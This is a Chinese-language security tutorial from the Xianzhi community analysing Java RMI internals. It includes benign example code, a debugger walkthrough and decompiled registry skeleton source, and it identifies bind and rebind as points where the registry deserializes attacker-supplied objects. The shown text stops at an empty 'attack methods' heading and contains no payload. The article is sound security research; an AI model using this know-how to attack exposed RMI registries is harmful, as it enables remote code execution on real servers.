# JAVA安全之RMI命令执行深度刨析-先知社区

> **来源**: https://xz.aliyun.com/news/16160  
> **文章ID**: 16160

---

## 基本介绍

Java RMI(Java Remote Method Invocation)是Java编程语言里一种用于实现远程过程调用的应用程序编程接口，它使客户机上运行的程序可以调用远程服务器上的对象，远程方法调用特性使JAVA编程人员能够在网络环境中分布操作，RMI全部的宗旨就是尽可能简化远程接口对象的使用

## 核心组成

JAVA RMI由以下三个核心部分组成：

* RMI Client：发起远程方法调用的程序，客户端通过调用Naming.lookup()方法使用字符串形式的对象名从RMI Registry获取远程对象的Stub，获得Stub后客户端就可以像调用本地对象一样调用远程对象的方法
* RMI Server：提供远程服务的程序，包含了实际的远程对象实现，服务器程序在启动时需要创建远程对象实例并使用Naming.rebind()方法将其与指定的名称绑定到RMI Registry，当接受到来自客户端的远程调用请求时，服务器会执行相应的操作并返回结果
* RMI Registry：运行在服务器上的一个简单的名称服务，用于管理远程对象的注册和查找，RMI Registry通常在独立的进程中运行(默认端口为1099)，服务器在启动时会注册其提供的远程对象使得客户端能够通过名称访问这些对象

## 通信交互

(1) RMI客户端和服务端交互流程：

![](images/20241213141211-30cddf0e-b919-1.png)

备注：RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节，RMI框架为远程对象分别生成了客户端代理和服务器端代理，位于客户端的代理必被称为存根(Stub)，位于服务器端的代理类被称为骨架(Skeleton)

(2) Stub和Skeleton通信过程

![](images/20241213141231-3cf814b6-b919-1.png)

(3) JVM之间的通信过程(远程调用)

使用远程方法调用时会涉及参数的传递和执行结果的返回，参数或者返回值可以是基本数据类型也可以是对象的引用，所以这些需要被传输的对象必须可以被序列化，这就要求相应的类必须实现java.io.Serializable接口并且客户端的serialVersionUID字段要与服务器端保持一致  
JVM之间通信时RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理，Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法，Stub中包含了远程对象的定位信息，例如：Socket端口、服务端主机地址等，同时也实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的

![](images/20241213141344-6814d562-b919-1.png)

从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后通过Socket通信传递，随后从Skeleton到Server纵向流动的，具体流程如下：

* Server端监听一个端口，端口由JVM随机选择
* Client端不知道Server远程对象的通信地址和端口，但Stub中包含了这些信息并封装了底层网络操作
* Client端可以直接调用Stub上的方法
* Stub连接到Server端监听的通信端口并提交参数
* 远程Server端上执行具体的方法并返回结果给Stub
* Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样

假设Stub可以通过调用某个远程服务上的方法来向远程服务获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题，JDK提供了一个RMI注册表(RMIRegistry)来解决这个问题，RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令，使用RMI Registry之后，RMI的调用关系应该是这样的：

![](images/20241213141529-a7039dbc-b919-1.png)

从客户端角度来看服务端应用是有两个端口的，其中一个是RMI Registry端口(默认为1099)，另一个是远程对象的通信端口(随机分配的)，通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中，而RMI Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下  
总结归纳：  
1、任何一个以对象为参数的RMI接口都可以发一个自己构建的对象过去从而迫使服务器端将对象按任何一个存在于服务端classpath中的可序列化类来反序列化恢复对象  
2、JVM之间远程通信时，数据对象是通过网络进行传输的，RMI会使用序列化机制将对象转换为字节流之后再进行传输，随后接受一端会进行反序列化操作将数据进行还原

## 数据传递

在RMI中数据传递可以分为本地传递和远程传递两种场景：

### 本地传递

本地传递指的是在同一个JVM内的方法调用，即对象和数据都是在本地内存中进行处理，这是最基本的参数传递机制，涉及到对基本类型和对象引用的传递  
(1) 基本数据类型：传递时会将值的副本传递给方法，因此方法内部对该值的修改不会影响原始变量

```
public class LocalPassing {
    public static void main(String[] args) {
        int number = 5;
        System.out.println("Before: " + number);
        modifyValue(number);
        System.out.println("After: " + number);
    }

    public static void modifyValue(int value) {
        value += 10;         // 仅修改了value的副本
    }
}

```

(2) 对象类型：传递的是对象引用的值，因此方法内部对该对象的属性的修改会影响原始对象，但如果重新赋值对象引用则只会影响局部引用，不会改变外部的引用

```
class Person {
    String name;

    Person(String name) {
        this.name = name;
    }
}

public class LocalObjectPassing {
    public static void main(String[] args) {
        Person person = new Person("Alice");
        System.out.println("Before: " + person.name);
        modifyName(person);
        System.out.println("After: " + person.name);
    }

    public static void modifyName(Person p) {
        p.name = "Bob"; // 改变了对象的属性
    }
}

```

### 远程传递

远程传递发生在不同的Java虚拟机之间，在这种情况下对象通过网络进行传输，RMI使用序列化机制将对象转换为字节流，从而能够在网络上传输，在进行远程调用时传递的对象需要实现java.io.Serializable接口，通过序列化Java将对象的状态转化为字节序列，然后将这些字节通过网络发送，另外一端接收方在接收到字节流后会通过反序列化将其还原为对象  
(1) 定义远程接口

```
import java.rmi.Remote;
import java.rmi.RemoteException;

// 定义远程接口
public interface RemoteService extends Remote {
    String getMessage(MyObject obj) throws RemoteException;
}

```

(2) 实现远程接口

```
// 实现远程接口
import java.rmi.server.UnicastRemoteObject;

public class RemoteServiceImpl extends UnicastRemoteObject implements RemoteService {
    protected RemoteServiceImpl() throws RemoteException {}

    @Override
    public String getMessage(MyObject obj) {
        return "Received: " + obj.getData();
    }
}

```

(3) 可被传输的对象

```
import java.io.Serializable;

public class MyObject implements Serializable {
    private static final long serialVersionUID = 1L; // 序列化版本号
    private String data;

    public MyObject(String data) {
        this.data = data;
    }

    public String getData() {
        return data;
    }
}

```

远程调用时有两个重要的概念：

* Stub：客户端与远程服务之间的代理，负责将方法调用请求发往服务器
* Skeleton：在较新的Java版本中已被弃用，属于服务器端的组件，负责接收来自Stub的请求并将调用转发到实际的实现对象

## 动态加载

JAVA RMI的核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，那么它可以从远程URL下载这个类的class，动态加载的class文件可以使用<http://、ftp://、file://进行托管，这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的java.rmi.server.codebaseURL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类，客户端与服务端两边的java.rmi.server.codebaseURL都是互相传递的，客户端何服务端要远程加载类都需要满足以下条件：>

* Java SecurityManager默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy
* java.rmi.server.useCodebaseOnly的值必需为false，该值从JDK 6u45、7u21、8u121开始，java.rmi.server.useCodebaseOnly的默认值就是true，当该值为true时将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase指定路径加载类文件，使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性

![](images/20241213141814-0925fc42-b91a-1.png)

## JRMP类

### 基本介绍

JRMP(JAVA Remote Method Protocol，即Java远程方法调用协议)是特定于Java技术的、用于查找和引用远程对象的协议，运行在Java远程方法调用(RMI)之下、TCP/IP之上的线路层协议(英语：Wire protocol)，同时JRMP协议规定了在使用RMI的时候传输的数据中如果包含有JAVA原生序列化数据时，无论是在JRMP的客户端还是服务端，在接收到JRMP协议数据时都会把序列化的数据进行反序列化的话，这就有可能导致反序列化漏洞的产生了

### 实现方式

JRMP接口的两种常见实现方式：

* JRMP协议(Java Remote Message Protocol)，RMI专用的Java远程消息交换协议
* IIOP协议(Internet Inter-ORB Protocol) ，基于CORBA实现的对象请求代理协议

### 简易示例

(1) 定义远程接口  
首先我们需要定义一个远程接口，这个接口描述了可以被远程调用的方法，需要注意的是这里的接口需要继承Remote且所有的远程方法都必须声明RemoteException

```
package org.al1ex;

import java.rmi.Remote;
import java.rmi.RemoteException;

// 定义远程接口
public interface HelloService extends Remote {
    String sayHello(String name) throws RemoteException;
}

```

(2) 实现远程接口  
接下来实现上述远程接口，创建一个完整的远程服务类，需要注意的是这个接口需要继承UnicastRemoteObject并实现一个无参构造方法：

```
package org.al1ex;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

// 实现远程接口
public class HelloServiceImpl extends UnicastRemoteObject implements HelloService {
    protected HelloServiceImpl() throws RemoteException {
        super();
    }

    public String sayHello(String name) throws RemoteException {
        return "Hello, " + name + "!";
    }
}

```

(3) 注册对象并启动JVM  
在服务器端我们需要创建一个RMI注册表将远程服务对象绑定到注册表中

```
package org.al1ex;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            // 创建远程对象
            HelloService helloService = new HelloServiceImpl();

            // 创建 RMI 注册表
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.rebind("HelloService", helloService); // 绑定远程对象到注册表

            System.out.println("RMI Server is ready.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

(4) 最后创建一个客户端来调用远程服务的sayHello方法

```
package org.al1ex;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) {
        try {
            // 获取 RMI 注册表
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            HelloService stub = (HelloService) registry.lookup("HelloService");

            // 调用远程方法
            String response = stub.sayHello("World");  // 传递参数 "World"
            System.out.println("Response from server: " + response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

服务端运行结果：

![](images/20241213142155-8cf6e70c-b91a-1.png)

客户端运行结果：

![](images/20241213142211-968a1302-b91a-1.png)

## 源码调试

下面我们对上面的源代码进行调试分析来深入刨析JAVA RMI的整个工作流程：

### 服务发布阶段

首先来看一下RMI的服务发布阶段，此阶段首先需要实例化一个helloImpl实例对象：

![](images/20241213142231-a28eda02-b91a-1.png)

这个实例化过程实际上是通过super()方法来调用父类UnicastRemoteObject的构造方法来创建的

![](images/20241213142245-aa936eca-b91a-1.png)  
UnicastRemoteObject构造方法会指定一个匿名端口并调用exportObject()方法来发布服务

![](images/20241213142258-b26c141c-b91a-1.png)

### 封装网络信息

exportObject是一个静态函数，由于之前因为继承了UnicastRemoteObject类，所以静态函数会自动执行，从下面可以看到这里最终向exportObject传递了一个远程对象和一个UnicastServerRef类

![](images/20241213142318-be6d826e-b91a-1.png)

这里的UnicastServerRef(port)其实是用于处理网络请求的，我们跟进其构造方法可以看到其中实例化了一个LiveRef类型的属性并调用其父类的构造方法

![](images/20241213142334-c8142f70-b91a-1.png)

随后在这里调用了LiveRef的构造函数

![](images/20241213142347-cf8f9d3e-b91a-1.png)

LiveRef的实例化过程中会调用TCPEndpoint.getLocalEndpoint()方法来封装当前的网络信息

![](images/20241213142401-d7c230c0-b91a-1.png)

![](images/20241213142409-dcbb6c5e-b91a-1.png)  
随后再次调用重载的LiveRef方法完成对象的实例化

![](images/20241213142426-e703cdc8-b91a-1.png)

随后回到上层调用父类UnicastRef的构造方法

![](images/20241213142443-f0f31d3e-b91a-1.png)

这里其实就是一个赋值操作，

![](images/20241213142459-fa685d3e-b91a-1.png)

### 创建Stub对象

随后回到上层调用exportObject方法，继续跟进

![](images/20241213142520-07108dcc-b91b-1.png)  
在这会判断传入的对象是不是我们要发布的服务对象(即继承了UnicastRemoteObject接口)，如果是则将该对象设置为当前对象并通过exportObject()方法来发布

![](images/20241213142538-11be85da-b91b-1.png)

随后继续跟进exportObject()方法，这里会先用我们传入的参数创建一个代理对象，这个代理对象实际上就是之前一直说的STUB存根对象，我们来看一看它到底是如何生成的

![](images/20241213142554-1b515d34-b91b-1.png)

### 动态代理Stub

在该方法中会先获取被提供服务的实现类，这个实现类必须要继承java.rmi.Remote接口，然后程序会判断存根类是否存在

![](images/20241213142618-298bb142-b91b-1.png)

stubClassExists(var3)：函数用于判断存根类是否存在,withoutStub属性包含被提供服务的接口实现类的缓存，代码中会判断该缓存中是否存在被提供方法的实现类，如果没有则调用Class.forName()方法查找对应的存根类，如果没有查询到对应类则代码将抛出ClassNotFoundException异常并将传入的接口实现类(helloServiceImpl.class)存入withoutStub属性中并返回False，在初始化阶段存根类肯定不存在(默认不使用RMIC手动生成)，程序无法直接调用createStub()方法来实例化存根对象

![](images/20241213142636-342657b0-b91b-1.png)

!ignoreStubClasses：属性表示存根类的生成方式,，如果ignoreStubClasses == True，则代表存根类是通过RMIC手动生成的，如果ignoreStubClasses == False, 则代表存根类需要通过动态代理模式来生成，该属性在初始化时会被赋值为False, 因此这里!ignoreStubClasses ==True，即需要下文通过JDK原生动态代理来生成存根类

![](images/20241213142652-3e24e060-b91b-1.png)

var2：UnicastServerRef.forceStubUse属性值，如果该属性值为True，则代表当存根类不存在，此时会抛出异常并结束程序运行，该属性的默认值为False：

![](images/20241213142707-46b57668-b91b-1.png)

根据上面的分析我们知道IF语句中第2个和第3个条件应该是同时判断的，即同时判断存根类是否存在以及存根类的来源，这也引申出另一个点Java中&&运算符优先级高于||元素符，所以程序会先对第2个和第3个条件进行判断，Else代码块的内容非常眼熟，这是JDK原生动态代理，要想使用JDK原生动态代理就必须传入以下三个参数：

* 动态代理类的类加载器ClassLoader
* 被代理对象接口数组Interfaces
* 调用处理器InvocationHandler

代码中会逐一获取这些参数最后再通过Proxy.newProxyInstance()方法生成动态代理对象：

![](images/20241213142751-6108c5a6-b91b-1.png)

被代理的对象中有HelloService接口, 这刚好是我们要提供服务的接口，根据JDK原生动态代理的机制，所有访问HelloService接口方法的调用请求都会被转发到调用处理器的invoke()方法中去，这里还未进行方法调用，因此我们暂且跳过这里来看一看createProxy()方法的返回值，可以看到生成的动态代理对象的确代理了HelloServiceImpl.sayHello()方法, 说明我们的代码没错

![](images/20241213142807-6aa0e2d8-b91b-1.png)

紧接着程序会判断生成的代理对象是否属于RemoteStub类型及其子类，如果判断条件成立则程序会调用setSkeleton()方法生成Skeleton(服务端的代理)，RemoteStub对象是通过createStub()方法生成的，但这里还未生成存根对象故不会调用setSkeleton()方法，此时存根类的初始化工作就已经完成了

![](images/20241213142824-74c0dfc0-b91b-1.png)

### 开启端口监听

随后程序会实例化一个Target对象，该对象封装了服务接口的实现类和生成的动态代理类等信息并调用exportObject()方法来创建服务

![](images/20241213142841-7ea0d3b0-b91b-1.png)

随后跟进到TCPTransport.exportObject()方法后会看到调用了一个listen()方法，这个方法用于开启Socket端口监听，此外一个端口上可能会发布多个服务，因此使用this.exportCount属性来记录发布的服务个数

![](images/20241213142855-87266f9a-b91b-1.png)

该方法中会先获取一些端口信息和IP地址信息，然后判断this.server属性是否为空，此时服务还未启动，因此我们跟进到if语句结构中，在if语句结构中会调用TCPEndpoint.newServerSocket()方法来开启端口监听

![](images/20241213142910-906284d6-b91b-1.png)

然后会创建并启动了一个新的线程来循环监听端口数据：

![](images/20241213142925-992744b2-b91b-1.png)  
此外程序还会将Target对象添加到ObjectTable中，便于RMI客户端通过它找到远程对象的存根对象

![](images/20241213142940-a222d4fa-b91b-1.png)

### 服务注册阶段

接下来需要通过LocateRegister.createRegister()方法在RMIRegister上注册服务

![](images/20241213143004-b08133de-b91b-1.png)

CreateRegister()方法中会实例化一个RegistryImpl对象，端口默认1099

![](images/20241213143018-b8c96bc4-b91b-1.png)

随后我们直接跟进其构造方法，在这里同样会实例化LiveRef对象与UnicastServerRef对象，这里的步骤与前文基本一致，只是端口号被指定为1099，且UnicastServerRef.filter属性被指定为RegisterFilter

![](images/20241213143036-c36d4a46-b91b-1.png)

接下来继续调用UnicastServerRef.export()来创建Stub代理对象

![](images/20241213143049-cb5d5b06-b91b-1.png)

![](images/20241213143101-d26c9cd6-b91b-1.png)

这一步我们比较熟悉了，但不同的是这里被提供服务的实现类是RegistryImpl，它是一个JDK内置类，因此RegistryImpl\_Stub.class是存在的

![](images/20241213143118-dc76364c-b91b-1.png)

存根类存在程序就会通过createStub()方法来生成存根对象并返回

![](images/20241213143137-e7ecc856-b91b-1.png)

![](images/20241213143148-ee0e1884-b91b-1.png)

返回的对象是remoteStub类型, 那么程序就调用setSkeleton()与createSkeleton()方法来生成Skeleton对象

![](images/20241213143203-f70dedf6-b91b-1.png)

![](images/20241213143213-fcf70e14-b91b-1.png)  
根据之前的流程图得知Skeleton是服务端的代理，在这里它也是直接通过forName创建出来的

![](images/20241213143228-061eba5a-b91c-1.png)

然后就是生成Target对象并发布服务了

![](images/20241213143243-0f1b6e78-b91c-1.png)

### 服务绑定阶段

在测试代码中是通过registry.rebind方法进行服务绑定

![](images/20241213143305-1c3dfa76-b91c-1.png)

此时会增加一组Key-Value

![](images/20241213143322-26095d20-b91c-1.png)

### 方法调用阶段

#### RMI注册表获取

接下来我们来看看客户端远程方法调用的流程是怎么样的，首先获取Registry实例对象：

![](images/20241213143349-3661fe20-b91c-1.png)

随后调用java.rmi.registry.LocateRegistry#getRegistry(java.lang.String, int)获取注册表

![](images/20241213143402-3e20c312-b91c-1.png)

跟进getRegistry函数，这里对传入的port参数和host参数进行了检查，首先检查port是否小于零，如果小于零则直接赋值默认值1099，检查host是否为空，如果为空(被阻断等情况)则直接获取本地地址作为host地址

![](images/20241213143414-4532d3a2-b91c-1.png)

随后实例化LiveRef对象与UnicastServerRef对象(和上文一样封装网络信息)并通过createProxy创建代理

![](images/20241213143426-4c3e494c-b91c-1.png)

在这里会检索sun.rmi.registry.RegistryImpl是否存在，随后创建客户端的本地代理stub存根用于后期和服务端进行交互：

![](images/20241213143438-53d9fc78-b91c-1.png)

![](images/20241213143449-5a3a4b22-b91c-1.png)

紧接着调用registry.lookup根据key值来查找注册表中的value信息：

![](images/20241213143504-62e20346-b91c-1.png)

随后跟进registry.lookup()方法，这里会先通过UnicastRef.newCall()方法完成RMI握手

![](images/20241213143519-6bf90dee-b91c-1.png)

newCall的具体实现代码如下所示：

![](images/20241213143544-7ab1edc4-b91c-1.png)

随后通过writeObject()写入序列化数据(查找的服务HelloService)

![](images/20241213143558-8348eff0-b91c-1.png)

最后再通过UnicastRef.invoke()方法发送数据

![](images/20241213143612-8bcf115e-b91c-1.png)

随后RMIRegistry会返回我们之前创建的Stub存根对象(动态代理对象)，RMIClient会调用readObject()方法来反序列化该对象，最后再通过done()方法完成垃圾回收

![](images/20241213143628-95753440-b91c-1.png)

#### 远程方法的调用

随后RMIClient会调用代理类的sayHello()方法

![](images/20241213143647-a09954a0-b91c-1.png)

方法调用请求会被转发到调用处理器的invoke()方法中(RemoteObjectInvocationHandler.invoke())

![](images/20241213143701-a8d7e140-b91c-1.png)

最后逐步转发到UnicastRef.invoke()方法中

![](images/20241213143715-b106eff0-b91c-1.png)

invoke()方法中会先通过marshalValue()方法组合要发送的数据，可以看到这里会组合我们传入的参数"World"以及传入参数的类型

![](images/20241213143727-b86b171c-b91c-1.png)

当数据组合好后RMIClient会调用executeCall()方法来发送数据

![](images/20241213143741-c0d11910-b91c-1.png)

然后等待被调用的方法在RMIServer执行完并获取返回值

![](images/20241213143757-ca82a53c-b91c-1.png)

最后断开链接：

![](images/20241213143814-d44a2c8e-b91c-1.png)

完成最终的调用：

![](images/20241213143831-de9bf0dc-b91c-1.png)

## 反序列化

基于上面我们从源代码角度对JAVA RMI工作流程进行分析，从中我们也看到了好几处的序列化操作和反序列化操作，下面我们对上面可利用的点进行详细介绍：

### 攻击注册中心类

#### 源码分析

RegistryImpl\_Skel类实现了RMI的基本骨架，负责解析客户端请求并调用相应的本地方法，它确保了方法调用的安全性和一致性并通过接口哈希值来防止版本不匹配的问题，在RegistryImpl\_Skel源码文件中我们发现我们可以与注册中心进行如下几个方法的交互：

##### 方法1：bind方法

功能说明：bind方法是RMI注册表中的一个关键操作，它主要用于将一个远程对象与给定的名称进行绑定  
源码分析：从下面的源代码中可以看到当我们对一个远程对象和给定的名称进行绑定操作时会对传递过来的通信数据流进行一次反序列化操作，故此可以利用  
源码代码：

```
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
        if (var4 != 4905912898345647071L) {
            throw new SkeletonMismatchException("interface hash mismatch");
        } else {
            RegistryImpl var6 = (RegistryImpl)var1;
            String var7;
            Remote var8;
            ObjectInput var10;
            ObjectInput var11;
            switch (var3) {
                case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var94) {
                        throw new UnmarshalException("error unmarshalling arguments", var94);
                    } catch (ClassNotFoundException var95) {
                        throw new UnmarshalException("error unmarshalling arguments", var95);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.bind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var93) {
                        throw new MarshalException("error marshalling return", var93);
                    }

```

下面是一个简单的代码示例，展示如何使用bind方法将一个远程对象注册到RMI注册表中：

A、服务端注册：从上面的调试分析过程中我们可以了解到在启动服务端的时候会创建注册表中心，随后我们可以进行注册操作，示例代码如下

```
package org.al1ex;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            // 创建远程对象
            HelloService helloService = new HelloServiceImpl();

            // 创建 RMI 注册表
            Registry registry = LocateRegistry.createRegistry(1099);
            registry.bind("HelloService", helloService); // 绑定远程对象到注册表

            System.out.println("RMI Server is ready.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

![](images/20241213143938-067b95ee-b91d-1.png)

B、客户端注册：在客户端我们可以在本地利用注册表一端存在的反序列化Gadget来构造对象并获取RMI注册表后执行绑定操作

```
package org.al1ex;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class registryClient {
    public static void main(String[] args) {
        try {
            // 创建远程对象
            SimpleSec simpleSec = new SimpleSecImpl();

            // 获取 RMI 注册表
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);
            registry.rebind("simpleSec", simpleSec); // 绑定远程对象到注册表

            System.out.println("simpleSec bind successfully.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

![](images/20241213144001-141400ec-b91d-1.png)

##### 方法2：list方法

功能说明：list方法用于获取注册表中当前所有已绑定名称的列表  
源码分析：从下面的源代码中可以看到我们获取注册表中绑定名称的列表时只是进行了一个简单的检索，期间没有反序列化操作，所以无法用于攻击注册中心  
源码代码：

```
case 1:
                    var2.releaseInputStream();
                    String[] var97 = var6.list();

                    try {
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }

```

下面是一个简单的示例用于获取注册中心的对象列表信息：

```
package org.al1ex;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class registryList {
    public static void main(String[] args) {
        try {
            // 获取指向 RMI 注册表的引用
            Registry registry = LocateRegistry.getRegistry("localhost", 1099);

            // 调用 list 方法以获取所有绑定的名称
            String[] names = registry.list();

            // 输出所有名称
            System.out.println("Bound remote objects:");
            for (String name : names) {
                System.out.println(name);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

运行结果如下所示：

![](images/20241213144050-311bde30-b91d-1.png)

##### 方法3：lookup

功能说明：lookup方法是RegistryImpl\_Skel类中的一个处理请求的逻辑块，这个方法用于查找已经注册的远程对象并返回与给定名称关联的远程对象的引用  
源码分析：从下面的源代码中可以看到这里会对传入的通信数据流进行反序列化操作，不过此时只能传递字符串对象，不能传递恶意对象给注册中心从而实现攻击目的，但是可以利用伪造连接请求直接通过反射实现  
源码代码：

```
case 2:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var8 = var6.lookup(var7);

                    try {
                        ObjectOutput var9 = var2.getResultStream(true);
                        var9.writeObject(var8);
                        break;
                    } catch (IOException var88) {
                        throw new MarshalException("error marshalling return", var88);
                    }

```

##### 方法4：rebind

功能说明：rebind方法是RMI注册表中的一个重要操作，用于将远程对象与给定的名称重新绑定，它可以用来替换注册表中已经存在的对象，而不管这个对象之前是否绑定过相同的名称  
源码分析：从下面的源代码中可以看到在进行rebind的时候会对传递过来的通信数据进行一次反序列化操作，故此可以用于进行反序列化操作~  
源码代码：

```
case 3:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.rebind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }

```

##### 方法5：unbind

功能说明：unbind方法是RMI注册表中的一个重要操作，用于解除与指定名称绑定的远程对象，通过调用unbind方法可以将某个远程对象从RMI注册表中移除，允许使用相同名称重新绑定其他对象  
源码分析：从下面的源代码中可以看到这里再进行unbind的时候会进行一次反序列化操作，不过此时只能传递字符串对象，不能传递恶意对象给注册中心从而实现攻击目的，但是可以利用伪造连接请求直接通过反射实现  
源码代码：

```
case 4:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.unbind(var7);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var80) {
                        throw new MarshalException("error marshalling return", var80);
                    }

```

完整源代码如下：

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package sun.rmi.registry;

import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.rmi.MarshalException;
import java.rmi.Remote;
import java.rmi.UnmarshalException;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.Skeleton;
import java.rmi.server.SkeletonMismatchException;

public final class RegistryImpl_Skel implements Skeleton {
    private static final Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};
    private static final long interfaceHash = 4905912898345647071L;

    public RegistryImpl_Skel() {
    }

    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
        if (var4 != 4905912898345647071L) {
            throw new SkeletonMismatchException("interface hash mismatch");
        } else {
            RegistryImpl var6 = (RegistryImpl)var1;
            String var7;
            Remote var8;
            ObjectInput var10;
            ObjectInput var11;
            switch (var3) {
                case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var94) {
                        throw new UnmarshalException("error unmarshalling arguments", var94);
                    } catch (ClassNotFoundException var95) {
                        throw new UnmarshalException("error unmarshalling arguments", var95);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.bind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var93) {
                        throw new MarshalException("error marshalling return", var93);
                    }
                case 1:
                    var2.releaseInputStream();
                    String[] var97 = var6.list();

                    try {
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }
                case 2:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var8 = var6.lookup(var7);

                    try {
                        ObjectOutput var9 = var2.getResultStream(true);
                        var9.writeObject(var8);
                        break;
                    } catch (IOException var88) {
                        throw new MarshalException("error marshalling return", var88);
                    }
                case 3:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.rebind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }
                case 4:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.unbind(var7);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var80) {
                        throw new MarshalException("error marshalling return", var80);
                    }
                default:
                    throw new UnmarshalException("invalid method number");
            }

        }
    }

    public Operation[] getOperations() {
        return (Operation[])operations.clone();
    }
}

```

## 攻击方式

